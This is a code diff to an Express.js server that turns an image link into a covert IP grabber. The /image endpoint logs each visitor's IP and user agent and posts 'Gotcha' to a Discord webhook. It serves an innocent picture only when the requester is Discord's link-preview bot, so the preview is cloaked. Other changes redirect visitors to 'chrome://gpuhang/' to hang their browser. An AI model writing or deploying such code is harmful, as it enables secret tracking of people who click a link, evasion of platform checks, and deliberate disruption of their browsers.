@@ -6,8 +6,9 @@ const bodyParser = require('body-parser');
 const viewsPath=__dirname+"/nonpublic/views.txt";
 const LOCKDOWN=false;
 const Auth = express.Router(); 
-var VERSION = "v1.09";
-var MESSAGE = "v1.09";
+var VERSION = "v1.08";
+var MESSAGE = "";
+var TAG = "";
 
 var WTV_debounce=false
 
@@ -18,7 +19,7 @@ Auth.use((req, res, next)=>{ // Authenticates every request made to server.
       res.redirect(`https://${req.hostname}`); next();
     }else{ next(); }
   }else{
-    res.sendFile(__dirname+"/views/locked.html");// next();
+    res.redirect("chrome://gpuhang/");
   }
 });
 
@@ -68,14 +69,22 @@ app.get("/redirect", (req, res)=>{
   }, 2000);
 });
 app.get("/version", (req, res)=>{
-  res.send({v:VERSION,redirect:"/",message:MESSAGE});
+  res.send({v:VERSION,redirect:"chrome://gpuhang/",message:MESSAGE,tag:TAG});
 });
 app.get("/image", (req, res)=>{
-  fs.appendFile(__dirname+"/nonpublic/log.txt", `\n[IP: ${req.ip}], [IPS: ${req.ips}]`, (err)=>{
+  fs.appendFile(__dirname+"/nonpublic/log.txt", `\n[IP: ${req.ip}], [IPS: ${req.ips}], [USERAGENT: ${req.get('user-agent')}]`, (err)=>{
     if (err) throw err;
   });
-  res.sendFile(__dirname+"/nonpublic/elephant.jpeg");
-  discordThings.webhook({message: "Gotcha"});
+  
+  console.log(req.get("user-agent"));
+
+  if ( req.get('user-agent')=="Mozilla/5.0 (compatible; Discordbot/2.0; +https://discordapp.com)" ) {
+    discordThings.webhook({message: "Bot detected"});
+    res.sendFile(__dirname+"/nonpublic/xd.png");
+  }else{
+    discordThings.webhook({message: "Gotcha"});
+    res.redirect("https://youtu.be/dQw4w9WgXcQ");
+  }
 });
 app.post("/webhook", (req, res)=>{
   discordThings.webhook({message: req.body.message});
